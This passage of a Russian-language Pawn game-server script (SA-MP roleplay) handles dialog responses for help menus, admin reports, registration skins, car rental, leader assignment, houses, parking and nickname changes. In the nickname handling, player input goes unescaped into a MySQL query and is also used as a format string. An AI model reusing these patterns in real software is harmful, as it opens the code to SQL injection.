						case 1: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Дом","{FFFFFF}/house – Меню дома\n\n/sellhouse – Продать дом игроку\n\n/changehouse – Обменяться домами с игроками\n\n/sellhousegos – Продать дом государству","Назад","");
						case 2: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Бизнес","{FFFFFF}/buybiz – Купить бизнес\n\n/sellbizgos – Продать бизнес государству\n\n/biz – Меню бизнеса\n\n/sellbiz – Продать бизнес игроку\n\n/changebiz – Обменяться бизнесами с игроком","Назад","");
						case 3: MyCom(playerid);
						case 4: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Управление организацией","{FFFFFF}/invite - Пригласить игрока в огранизацию\n\n/uninvite - Уволить игрока из организации\n\n/giverank - Повысить/Понизить ранг игрокуn\n\n/members - Посмотреть состав организации онлайн\n\n/lpanel - Панель лидера\n\n/givekeys - Выдать ключи от входа\n\n/offmembers - Состав организации\n\n/vig - Выдать предупреждение\n\n/unvig - Снять предупреждение","Назад","");
						case 5: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Работа","{f7ae11}Механик{FFFFFF}\n\n/tow - Отбуксировать авто\n\n/repair - Починить авто\n\n{f7ae11}Развозчик продуктов{FFFFFF}\n\n/plist - Список заказов\n\n{f7ae11}Дальнобойщик{FFFFFF}\n\n/tmonitoring - Цены ресурсов\n\n/tbuy - Купить ресурсы\n\n/tsell - Продать ресурсы\n\n{f7ae11}Остальное{FFFFFF}\n\n/end - Закончить работу","Назад","");
						case 6:
						{
							query = "";
						    strcat(query,"{FFFFFF}/s – Крикнуть в чат\n\n/me – Действие в чат\n\n/try – Сделать попытку\n\n/do – Описание происходящего\n\n/todo - Действие от третьего лица с причастным оборотом\n\n/ame - Описание\n\n/b – Внеигровой (Нон-РП) чат\n\n/call – Позвонить по телефону\n\n/sms – Написать сообщение игроку на телефон\n\n/healme – Воспользоваться аптечкой");
                            strcat(query,"{FFFFFF}\n\n/eject – Выкинуть игрока из транспорта\n\n/leaders – Список лидеров в сети\n\n/fuel – Заправить транспорт\n\n/drop – Выкинуть предмет\n\n/usedrugs – Использовать наркотики\n\n/pay – Передать деньги\n\n/lic – Показать свои лицензии\n\n/pass – Показать документы\n\n");
                            ShowPlayerDialog(playerid,281,DIALOG_STYLE_MSGBOX,"Прочее",query,"Далее","Назад");
						
						}
						case 7: ShowPlayerDialog(playerid,23,DIALOG_STYLE_MSGBOX,"Семья","{FFFFFF}/family - Управление семьей\n\n/finvite - Принять в семью\n\n/funinvite - Выгнать из семьи\n\n/fc - Чат семьи\n\n/lock - Закрыть/открыть транспрот семьи","Назад","");
					}
				}
				default: cmd_menu(playerid,"");
			}
		}
		case 14:
		{
			switch(response)
			{
				case 1:
				{
			        if(GetPVarInt(playerid,"AntiFlood8") > gettime())
					{
					    new str[60];
					    format(str,sizeof(str),"Писать в репорт и задать вопрос вы сможете через %d сек.",GetPVarInt(playerid,"AntiFlood8")-gettime());
						return SendClientMessage(playerid,CGREY,str);
					}
					new text[150];
  					if(sscanf(inputtext, "s[150]",text)) return ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Связь с администрацией","{FFFFFF}Введите ID игрока и причину подачи на него в репорт:","Далее","Назад");
                    if(strlen(inputtext) < 5 || strlen(inputtext) > 150) return ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Связь с администрацией","{FFFFFF}Введите ID игрока и причину подачи на него в репорт:","Далее","Назад");
					static const fmt_str[] = "[A] Репорт от {FFFFFF}%s[id %d]:{D50000} %s";
		    		new str[sizeof(fmt_str)+32+4+150];
				    format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername],playerid,text);
				    SendAdminMessage(CLIGHTRED,str);
					SendClientMessage(playerid,CREWARD,"Ваше сообщение отправлено администрации");
					SetPVarInt(playerid,"AntiFlood8",gettime() + 60);
				}
				default: cmd_menu(playerid,"");
			}

		}
		case 15:
		{
			switch(response)
			{
				case 1:
				{
			        if(GetPVarInt(playerid,"AntiFlood8") > gettime())
					{
					    new str[60];
					    format(str,sizeof(str),"Писать в репорт и задать вопрос вы сможете через %d сек.",GetPVarInt(playerid,"AntiFlood8")-gettime());
						return SendClientMessage(playerid,CGREY,str);
					}
			        if(PlayerInfo[playerid][pHMuted] != 0)
			        {
 						static const fmt_str[] = "Молчанка заканчивается через %i секунд";
						new string[sizeof(fmt_str)+10];
						format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pHMuted]);
						SendClientMessage(playerid,CGREY,string);
						return true;
			        }
					new text[150];
  					if(sscanf(inputtext, "s[150]",text)) return ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Задать вопрос","{FFFFFF}Введите чётко поставленный вопрос:","Далее","Назад");
  					if(strlen(inputtext) < 5 || strlen(inputtext) > 150) return ShowPlayerDialog(playerid,14,DIALOG_STYLE_INPUT,"Задать вопрос","{FFFFFF}Введите чётко поставленный вопрос:","Далее","Назад");
					static const fmt_str[] = "[A] Вопрос от {FFFFFF}%s[id %d]:{D50000} %s";
		    		new str[sizeof(fmt_str)+32+4+150];
				    format(str, sizeof(str), fmt_str,PlayerInfo[playerid][pSendername],playerid,text);
				    SendAdminMessage(CLIGHTRED,str);
					SendClientMessage(playerid,CREWARD,"Ваше вопрос отправлен команде поддержки");
					SetPVarInt(playerid,"AntiFlood8",gettime() + 60);
					SetPVarInt(playerid,"Vopros",gettime() + 180);
				}
				default: cmd_menu(playerid,"");
			}

		}
		case 16:
		{
		    if(!response) return Kick(playerid, FIX_FUNCTION, 1200);
   			switch(PlayerInfo[playerid][pSex])
		    {
			    case 1:
			    {
				    switch(PlayerInfo[playerid][pRas])
				    {
				        case 1:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = EvropM18[random(3)];
							    case 26..35: PlayerInfo[playerid][pModel] = EvropM25[random(3)];
							    case 36..50: PlayerInfo[playerid][pModel] = EvropM35[random(3)];
							    case 51..70: PlayerInfo[playerid][pModel] = EvropM50[random(3)];
							}
				        }
				        case 2:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = NegrM18[random(2)];
							    case 26..35: PlayerInfo[playerid][pModel] = NegrM25[random(3)];
							    case 36..50: PlayerInfo[playerid][pModel] = NegrM35[random(3)];
							    case 51..70: PlayerInfo[playerid][pModel] = NegrM50[random(3)];
							}
				        }
       					case 3:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = AziatM18[random(1)];
    						 	case 26..35: PlayerInfo[playerid][pModel] = AziatM25[random(1)];
							    case 36..50: PlayerInfo[playerid][pModel] = AziatM35[random(1)];
							    case 51..70: PlayerInfo[playerid][pModel] = AziatM50[random(1)];
							}
				        }
       					case 4:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = LationM18[random(2)];
    						 	case 26..35: PlayerInfo[playerid][pModel] = LationM25[random(3)];
							    case 36..50: PlayerInfo[playerid][pModel] = LationM35[random(3)];
							    case 51..70: PlayerInfo[playerid][pModel] = LationM50[random(1)];
							}
				        }
				    }
			    }
			    case 2:
			    {
					switch(PlayerInfo[playerid][pRas])
				    {
				        case 1:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = EvropJ18[random(1)];
							    case 26..35: PlayerInfo[playerid][pModel] = 90;
							    case 36..50: PlayerInfo[playerid][pModel] = EvropJ35[random(1)];
							    case 51..70: PlayerInfo[playerid][pModel] = EvropJ50[random(3)];
							}
				        }
				        case 2:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = NegrJ18[random(1)];
							    case 26..35: PlayerInfo[playerid][pModel] = NegrJ25[random(1)];
							    case 36..50: PlayerInfo[playerid][pModel] = NegrJ35[random(1)];
							    case 51..70: PlayerInfo[playerid][pModel] = 218;
							}
				        }
				        case 3:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = 169;
							    case 26..35: PlayerInfo[playerid][pModel] = 263;
							    case 36..50: PlayerInfo[playerid][pModel] = 225;
							    case 51..70: PlayerInfo[playerid][pModel] = 224;
							}
				        }
				        case 4:
				        {
							switch(PlayerInfo[playerid][pVoz])
							{
							    case 18..25: PlayerInfo[playerid][pModel] = LationJ18[random(1)];
							    case 26..35: PlayerInfo[playerid][pModel] = LationJ25[random(1)];
							    case 36..50: PlayerInfo[playerid][pModel] = 151;
							    case 51..70: PlayerInfo[playerid][pModel] = LationJ50[random(1)];
							}
				        }
				    }
			    }
		    }
		    tp__ignore_tick[playerid] = GetTickCount()+TP__IGNORE_TIME;
	     	SetPVarInt(playerid,"ShaSpawn",1);
			SpawnReg[playerid] = true;
		    CreateAccount(playerid, PlayerInfo[playerid][pPassword]);
			PlayerInfo[playerid][pZakon] = 10;
			SetSpawnInfo(playerid, 255, PlayerInfo[playerid][pModel], 1474.1877,-2286.6375,22.3047,-1, -1, -1, -1, -1, -1, -1);
			new ipStr[16];
			GetPlayerIp(playerid, ipStr, 16 );
			strmid(PlayerInfo[playerid][pIpReg], ipStr, 0, strlen(ipStr), 16);
			SetPlayerStr(PlayerInfo[playerid][pSendername],"ipreg",PlayerInfo[playerid][pIpReg]);
			SetGolod(playerid,100);
			new sec,minut,hour,day,mouth,year;
			gettime(hour,minut,sec);
			getdate(year,mouth,day);
			PlayerInfo[playerid][pDateReg] = gettime();
			PlayerInfo[playerid][pDateIg] = gettime();
			SetPlayerInt(PlayerInfo[playerid][pSendername],"reg",PlayerInfo[playerid][pDateReg]);
		}
		case 17:
		{
			switch(response)
			{
			case 1:
			{
			    if(PlayerInfo[playerid][pCash] < 50)
				{
				 	SendClientMessage(playerid,CGREY,"Недостаточно средств");
				 	RemovePlayerFromVehicle(playerid);
				 	return true;
			 	}
				GiveMoney(playerid,-50);
				Locked[GetPlayerVehicleID(playerid)] = playerid;
				SendClientMessage(playerid,-1,"Вы арендовали автомобиль");
				RentCar[GetPlayerVehicleID(playerid)] = playerid;
				for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
			}
			default: RemovePlayerFromVehicle(playerid);
			}
		}
		case 18:
		{
			new playerd = GetPVarInt(playerid, "PlayerLeader");
			if(!response) return DeletePVar(playerid, "PlayerLeader");
			if(!IsPlayerConnected(playerd) || PlayerLogged[playerd] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
			if(PlayerInfo[playerd][pAdmin] == 0)
			{
                if(!strcmp(FracInfo[listitem+1][fLeader], "None", true))
                {
					strmid(FracInfo[listitem+1][fLeader],PlayerInfo[playerd][pSendername],0,strlen(PlayerInfo[playerd][pSendername]),MAX_PLAYER_NAME);
					SetFractionStr(listitem+1, "leader", PlayerInfo[playerd][pSendername]);
                }
                else
                {
					static const fmt_string2[] = "У этой фракции уже есть лидер (%s)";
					new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
		   			format(str2, sizeof(str2), fmt_string2,FracInfo[listitem+1][fLeader]);
					SendClientMessage(playerid,-1,str2);
					return true;
                }
			}
		//	if(listitem+1 == F_FBI) return SendClientMessage(playerid,CGREY,"Фракции недоступны");
			static const fmt_string[] = "[A] %s назначил лидера %s(%s)";
			new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
			format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[playerd][pSendername],FracInfo[listitem+1][fName]);
			SendAdminMessage(CGREY,str);
			PlayerInfo[playerd][pVipis] = 0;
			PlayerInfo[playerd][pRank] = 10;
			PlayerInfo[playerd][pLeader] = listitem+1;
			PlayerInfo[playerd][pMember] = listitem+1;
			if(IsAGang(playerd) || IsAMafia(playerid))
			{
				if(CaptInfo[PlayerInfo[playerd][pMember]-6][capture]) CaptGo(playerd);
			}
			PlayerInfo[playerd][pWork] = 1;
			PlayerInfo[playerd][pSpawnChange] = 1;
			SetPlayerInt(PlayerInfo[playerd][pSendername],"member",PlayerInfo[playerd][pMember]);
			SetPlayerInt(PlayerInfo[playerd][pSendername],"rank",PlayerInfo[playerd][pRank]);
			SetPlayerInt(PlayerInfo[playerd][pSendername],"leader",PlayerInfo[playerd][pLeader]);
			static const fmt_string1[] = "Теперь вы лидер организации \"%s\"";
			new str1[sizeof(fmt_string1)+32];
   			format(str1, sizeof(str1), fmt_string1,FracInfo[listitem+1][fName]);
   			SendClientMessage(playerd,CYELLOW,str1);
			SendClientMessage(playerd,CYELLOW,"Вы назначены лидером ориганизации. Команды: /mm » Команды сервера » Управление организацией");
		/*	if(IsAGang(playerd) || IsAMafia(playerd))
			{
				SendClientMessage(playerd,CYELLOW,"Вы можете покупать транспорт для организации на черных рынках");
				SendClientMessage(playerd,CYELLOW,"Используйте: /gps » Основное » Черный рынок | /gps » Основное » Черный рынок 2");
			}*/
			SpawnPlayer(playerd);
			DeletePVar(playerid, "PlayerLeader");
		
		}
		case 19:
		{
		    if(!response) return true;
		    switch(PlayerInfo[playerid][pWork])
		    {
			    case 0:
			    {
			   		SetPlayerSkin(playerid,(PlayerInfo[playerid][pSex] == 1)? (FracInfo[PlayerInfo[playerid][pMember]][fMSkin][PlayerInfo[playerid][pRank]-1]) : (FracInfo[PlayerInfo[playerid][pMember]][fWSkin]));
					SetColor(playerid);
					static const fmt_string1[] = "%s взял рацию и переоделся в рабочую одежду";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		   			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
					SetPlayerChatBubble(playerid,"Взял рацию и переоделся в рабочую одежду", COLOR_PURPLE, 30.0, 7000);
					PlayerInfo[playerid][pWork] = 1;

			    }
				case 1:
				{
	 				SetPlayerColor(playerid, 0xFFFFFF20);
					SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 4)) RemovePlayerAttachedObject(playerid, 4);
					static const fmt_string1[] = "%s положил рацию и переоделся в обычную одежду";
					new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		   			format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
					ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str1);
					SetPlayerChatBubble(playerid,"Положил рацию и переоделся в обычную одежду", COLOR_PURPLE, 30.0, 7000);
					PlayerInfo[playerid][pWork] = 0;
					if(GetPVarInt(playerid,"HealP") > 0)
					{
						DeletePVar(playerid,"HealP");
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					}

				}
		    }
		}
		case 20:
		{
		    if(!response) return true;
		    new krek;
		    if(sscanf(inputtext,"i",krek)) return ShowPlayerDialog(playerid,20,DIALOG_STYLE_INPUT,"Дома","{FFFFFF}Введите номер дома, который вы хотите приобрести:","Далее","Назад");
            if(krek < 1 || krek > TOTALHOUSE)
			{
	   			static const fmt_string1[] = "Дома от 1 до %i";
				new str1[sizeof(fmt_string1)+4];
				format(str1, sizeof(str1), fmt_string1,TOTALHOUSE);
		        SendClientMessage(playerid,CGREY,str1);
		        ShowPlayerDialog(playerid,20,DIALOG_STYLE_INPUT,"Дома","{FFFFFF}Введите номер дома, который вы хотите приобрести:","Далее","Назад");
		        return true;
		    }
   			if(!strcmp(HInfo[krek][hOwner], "None", true))
   			{
	   			static const fmt_string1[] = "{FFFFFF}Класс дома:\t%s\nЦена:\t\t$%i\n\nВы действительно хотите купить данный дом?";
				new str1[sizeof(fmt_string1)+4+4];
				format(str1, sizeof(str1), fmt_string1,HInfo[krek][hClass],HInfo[krek][hCost]);
    			ShowPlayerDialog(playerid,54,DIALOG_STYLE_MSGBOX,"Покупка",str1,"Да","Нет");
				SetPVarInt(playerid,"Biz",krek);
   			}
   			else
   			{
   			    if(!strcmp(HInfo[krek][hOwner], PlayerInfo[playerid][pSendername], true))
   			    {
					static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой дом\nи получить в замен половину от гос. стоимости?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}Дом №%i(%s класса)";
					new str2[sizeof(fmt_string2)+32+10];
					format(str2, sizeof(str2), fmt_string2,HInfo[GetPVarInt(playerid,"PlayerHouse")][hCost]/2,GetPVarInt(playerid,"PlayerHouse"),HInfo[GetPVarInt(playerid,"PlayerHouse")][hClass]);
					ShowPlayerDialog(playerid,112,DIALOG_STYLE_MSGBOX,"Продажа дома",str2,"Да","Нет");
					return true;
   			    }
	   			SendClientMessage(playerid,CGREY,"Данный дом занят");
		        ShowPlayerDialog(playerid,20,DIALOG_STYLE_INPUT,"Дома","{FFFFFF}Введите номер дома, который вы хотите приобрести:","Далее","Назад");
		        return true;
   			}
		}

		case 21:
		{
			if(!response) return true;
			new color[2], model, frac, status, Float:x, Float:y, Float:z, Float:angle;
			if(sscanf(inputtext,"p<,>iiii",model, color[0], color[1], frac)) return ShowPlayerDialog(playerid, 21,1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция\nПРИМЕР: 504, 1, 3, 4", "Принять", "Отмена");
			if(model < 400 || model > 611) return ShowPlayerDialog(playerid, 21, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[0] < 0 || color[0] > 252) return ShowPlayerDialog(playerid, 21, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(color[1] < 0 || color[1] > 252) return ShowPlayerDialog(playerid, 21, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			if(frac < 1 || frac > TOTALFRAC) return ShowPlayerDialog(playerid, 21, 1, "Добавить транспорт", "ВАЖНО: Модель, Цвет1, Цвет2, Фракция, Статус\nПРИМЕР: 504, 1, 3, 4, 0", "Принять", "Отмена");
			GetPlayerFacingAngle(playerid,angle);
			GetPlayerPos(playerid, x, y, z);
			new carid = CreateVehicle(model, x, y, z, angle, color[0], color[1], 90000);
			Fuel[carid] = 100;
			veh__pos[carid][0] = x;
			veh__pos[carid][1] = y;
			veh__pos[carid][2] = z;
			veh__pos[carid][3] = angle;
			vehicle__PutPlayerInVehicle(playerid, carid, 0);
			LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
			SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
			SetPVarInt(playerid, "AddVehicleFrac", carid);
			format(coordv, sizeof(coordv), "%i, %i, %i, %i, %i, %i, %i", model, color[0], color[1], frac,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),status);
			SendClientMessage(playerid, CAGREEN, "Тест транспорт создан. Установить координаты: /vpc");
		}
		case 23: ShowPlayerDialog(playerid,13,DIALOG_STYLE_LIST,"Команды сервера","{FFFFFF}1 | Машина\n2 | Дом\n3 | Бизнес\n4 | Организация\n5 | Управление организацией\n6 | Работа\n7 | Прочее","Далее","Назад");
		case 24:
		{
		    if(!response) return true;
			static const fmt_string[] = "%s";
			new str[sizeof(fmt_string)+64];
			format(str, sizeof(str), fmt_string,VehicleNameS[VInfo[ListNick[playerid][listitem]][vmodel]-400]);
			SetPVarInt(playerid,"MyCar",ListNick[playerid][listitem]);
			if(!VInfo[ListNick[playerid][listitem]][vfam])
			{
				static const fmt_sdtring[] = "{FFFFFF}1 | Припарковать\n2 | Ключи\t%s\n3 | Сигнализация\t%s\n4 | Отметить местоположение на карте\t[10$]\n5 | Посмотреть тех.паспорт\n{F85A5A}6 | Продать транспорт государству\n{F85A5A}7 | Продать транспорт игроку\n{F85A5A}8 | Обменяться транспортом с игроком";
				new stdr[sizeof(fmt_sdtring)+30*2];
				format(stdr, sizeof(stdr), fmt_sdtring,
	  			(!VInfo[ListNick[playerid][listitem]][vkeys]) ? ("{F85A5A}[Нет]{FFFFFF}") : ("{20BA09}[Вставленны]{FFFFFF}"),
				(!VInfo[ListNick[playerid][listitem]][vsing]) ? ("{F85A5A}[Выключена]{FFFFFF}") : ("{20BA09}[Включена]{FFFFFF}"));
	   			ShowPlayerDialog(playerid,28,DIALOG_STYLE_LIST,str,stdr,"Выбрать","Назад");
   			}
   			else
   			{
				new str1[67];
   			    format(str1,sizeof(str1),"{FFFFFF}1 | Припарковать\n2 | Ключи\t%s",(!VInfo[ListNick[playerid][listitem]][vkeys]) ? ("{F85A5A}[Нет]{FFFFFF}") : ("{20BA09}[Вставленны]{FFFFFF}"));
   			    ShowPlayerDialog(playerid,28,DIALOG_STYLE_LIST,str,str1,"Выбрать","Назад");
   			}
		}
  		case 25:
        {
            if(!response) return 1;
            new kok;
            if(sscanf(inputtext, "i",kok)) return ShowPlayerDialog(playerid,25,DIALOG_STYLE_INPUT,"Создание","{FFFFFF}Введите ID объяекта","Создать","Назад");
            new Float:X, Float:Y, Float:Z;
            GetPlayerPos(playerid, X, Y, Z);
            pobject[GetPVarInt(playerid,"ObjID")] = CreateDynamicObject(kok, X+1, Y+1, Z+1, 0.0,0.0,0.0);
            pobjectid[GetPVarInt(playerid,"ObjID")] = kok;
            EditDynamicObject(playerid,pobject[GetPVarInt(playerid,"ObjID")]);
            SetPVarInt(playerid,"ModelID",kok);
            DeletePVar(playerid,"ObjID");
            return 1;
        }
        case 26:
        {
        	if(!response) return cmd_objm(playerid,"");
	        switch(listitem)
	        {
		        case 0:
		        {
		            DestroyDynamicObject(pobject[GetPVarInt(playerid,"ObjID")]);
		            pobjectid[GetPVarInt(playerid,"ObjID")] = 0;
		            DeletePVar(playerid,"ObjID");
		        }
		        case 1: EditDynamicObject(playerid,pobject[GetPVarInt(playerid,"ObjID")]),SetPVarInt(playerid,"GoObj",1);
	        }
        }
        case 27:
        {
            if(!response) return 1;
            if(pobjectid[listitem] == 0)
            {
                ShowPlayerDialog(playerid,25,DIALOG_STYLE_INPUT,"Создание","{FFFFFF}Введите ID объяекта","Создать","Назад");
                SetPVarInt(playerid,"ObjID",listitem);
                return 1;
            }
            else
            {
            	ShowPlayerDialog(playerid,26,DIALOG_STYLE_LIST,"Редактирование","{FFFFFF}Удалить\nРедактировать","Создать","Назад");
                SetPVarInt(playerid,"ObjID",listitem);
                return 1;
            }
        }
        case 28:
        {
            if(!response) return true;
            switch(listitem)
            {
                case 0:
                {
                    if(GetPlayerState(playerid) != 2) return SendClientMessage(playerid,CGREY,"Вы не в своём транспортом средстве");
                    if(GetPlayerVehicleID(playerid) != VInfo[GetPVarInt(playerid,"MyCar")][vcar]) return SendClientMessage(playerid,CGREY,"Вы не в своём транспортом средстве");
	   				new Float:X,Float:Y,Float:Z,Float:FA;
   					new Float:heal;
   					new panels,doors_,lights_,tires;
					GetVehicleDamageStatus(GetPlayerVehicleID(playerid),panels,doors_,lights_,tires);
   					GetVehicleHealth(GetPlayerVehicleID(playerid),heal);
					GetVehicleZAngle(GetPlayerVehicleID(playerid), FA);
					GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
                    VInfo[GetPVarInt(playerid,"MyCar")][vx] = X; VInfo[GetPVarInt(playerid,"MyCar")][vy] = Y; VInfo[GetPVarInt(playerid,"MyCar")][vz] = Z;
                    VInfo[GetPVarInt(playerid,"MyCar")][vfa] = FA;
                    VInfo[GetPVarInt(playerid,"MyCar")][vvirt] = GetPlayerVirtualWorld(playerid);
                    VInfo[GetPVarInt(playerid,"MyCar")][vint] = GetPlayerInterior(playerid);
                    DestroyVehicle(GetPlayerVehicleID(playerid));
                    VInfo[GetPVarInt(playerid,"MyCar")][vcar] = CreateVehicle(VInfo[GetPVarInt(playerid,"MyCar")][vmodel],X,Y,Z,FA,VInfo[GetPVarInt(playerid,"MyCar")][vcolor1],VInfo[GetPVarInt(playerid,"MyCar")][vcolor2],-1);
                  	SetVehicleNumberPlate(VInfo[GetPVarInt(playerid,"MyCar")][vcar], VInfo[GetPVarInt(playerid,"MyCar")][vnumber]);
                  
					SetVehicleToRespawn(VInfo[GetPVarInt(playerid,"MyCar")][vcar]);
					UpdateVehicleDamageStatus(VInfo[GetPVarInt(playerid,"MyCar")][vcar],panels,doors_,lights_,tires);
	    			SetVehicleHealth(VInfo[GetPVarInt(playerid,"MyCar")][vcar],heal);
	    			PutPlayerInVehicle(playerid,VInfo[GetPVarInt(playerid,"MyCar")][vcar],0);
	    			SendClientMessage(playerid,-1,"Вы припарковали транспортное средство в данное место");
				//	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
				//	SetVehicleParamsEx(GetPlayerVehicleID(playerid),VEHICLE_PARAMS_OFF,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
					SetEngine(playerid,GetPlayerVehicleID(playerid),false);
					SetLights(playerid,GetPlayerVehicleID(playerid),false);
                    query = "";
                    
               	    format(query,sizeof(query),"UPDATE `veh` SET  x = '%f', y = '%f', z = '%f', fa = '%f', inter = '%d', virt = '%d' WHERE id = '%d' LIMIT 1",X,Y,Z,FA,GetPlayerInterior(playerid),
					GetPlayerVirtualWorld(playerid),   VInfo[GetPVarInt(playerid,"MyCar")][id]);
				    mysql_tquery(mysql,query);
                }
                case 1: cmd_keys(playerid);
                case 3:
                {
					if(PlayerInfo[playerid][pCash] < 10) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
					if(VInfo[GetPVarInt(playerid,"MyCar")][vsis]) return SendClientMessage(playerid,CGREY,"На транспорте не установлена система безопасности");
					GiveMoney(playerid,-10);
					new Float:x,Float:y,Float:z;
					GetVehiclePos(VInfo[GetPVarInt(playerid,"MyCar")][vcar],x,y,z);
                    SetPlayerRaceCheckpoint(playerid,2,x,y,z,0,0,0,10);
	    			SetPVarInt(playerid,"GPS",1);
	    			SendClientMessage(playerid,CREWARD,"Местоположение транспорта указано на карте!");
                }
                case 2: cmd_sing(playerid,"");
                case 4: cmd_carpass(playerid,"");
                case 5: cmd_sellcargos(playerid);

                case 6: SetPVarInt(playerid,"Obm",4),ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Продать транспорт игроку","{ffffff}Введите ID игрока и цену через запятую!\n\nНапример: 53,100000","Далее","Отмена");
				case 7: SetPVarInt(playerid,"Obm",5), ShowPlayerDialog(playerid,372,DIALOG_STYLE_INPUT,"Обменяться транспортом с игроком","{ffffff}Введите ID игрока и доплату через запятую!\n\nНапример: 53,100000","Далее","Отмена");
            }
        }
		case 29:
		{
		    if(!response) return ShowS(playerid);
		    new nick[32];
		    if(sscanf(inputtext,"s[32]",nick))
		    {
					ShowPlayerDialog(playerid, 29, DIALOG_STYLE_INPUT, "Смена ника", "{FFFFFF}Введите желаемый ник в окошко:\n{f7ae11}Внимание!{FFFFFF}\nНик должен быть не больше 32 символов\nИ иметь форму Имя_Фамилия", "Готово","Назад");
					SendClientMessage(playerid,CGREY,"Используйте в нике от 7 до 20 символов");
					return true;
		    }
		    if(strlen(nick) < 7 || strlen(nick)> 20)
		    {
					ShowPlayerDialog(playerid, 29, DIALOG_STYLE_INPUT, "Смена ника", "{FFFFFF}Введите желаемый ник в окошко:\n{f7ae11}Внимание!{FFFFFF}\nНик должен быть не больше 32 символов\nИ иметь форму Имя_Фамилия", "Готово","Назад");
					return true;
		    }
		    if(strfind(nick,"_",true) != -1)
		    {
			    format(PlayerInfo[playerid][pNick],MAX_PLAYER_NAME,nick);
	     		static const fmt_string[] = "[A]{ffffff} Заявка на смену от %s на %s";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[playerid][pNick]);
				SendAdminMessage(CYELLOW,str);
			}
			else ShowPlayerDialog(playerid, 29, DIALOG_STYLE_INPUT, "Смена ника", "{FFFFFF}Введите желаемый ник в окошко:\n{f7ae11}Внимание!{FFFFFF}\nНик должен быть не больше 32 символов\nИ иметь форму Имя_Фамилия", "Готово","Назад");
		}
		case 30:
		{
			if(listitem == 0) return true;
			else
			{
			    new i = ListNick[playerid][listitem];
			    switch(response)
			    {
			        case 1:
					{
					        query = "";
					        format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", PlayerInfo[i][pNick]);
							mysql_tquery(mysql, query, "CheckNicki", "dd", playerid,i);
							
					     /*   format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s'", PlayerInfo[i][pNick]);
							mysql_tquery(mysql,query);
							mysql_store_result();
							if(mysql_fetch_row(query))
							{
	  							static const fmt_string[] = "[A]{ffffff} %s отклонил заявку от %s на %s. Причина: Ник уже занят";
								new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
								format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[i][pSendername],PlayerInfo[i][pNick]);
								SendAdminMessage(CYELLOW,str);
								format(PlayerInfo[i][pNick],MAX_PLAYER_NAME,"None");
								cmd_ns(playerid,"");
								return true;
							}
							if(strlen(PlayerInfo[i][pNick]) < 5 || !IsPlayerConnected(i))
							{
							    SendClientMessage(playerid,CGREY,"Игрок отключился от сервера или уже сменил ник");
							    cmd_ns(playerid,"");
							    return true;
							}
